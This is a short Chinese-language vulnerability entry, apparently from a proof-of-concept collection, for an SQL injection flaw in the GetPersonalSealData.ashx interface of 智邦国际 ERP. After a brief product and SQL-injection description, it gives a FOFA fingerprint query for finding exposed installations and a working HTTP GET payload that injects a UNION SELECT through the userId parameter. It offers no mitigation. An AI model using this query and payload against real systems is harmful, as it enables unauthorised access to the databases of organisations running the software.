## 智邦国际ERP-GetPersonalSealData.ashx SQL注入漏洞

## 一、漏洞简介
智邦国际以“一体化”为顶层设计理念，全面布局产品生态，满足不同行业、不同管理层次、不同信息化程度的企业需求。智邦国际ERP系统GetPersonalSealData.ashx接口处存在sql注入漏洞，SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。

## fofa
```
icon_hash="-682445886"
```

## POC
```
GET /SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version-- HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1
```
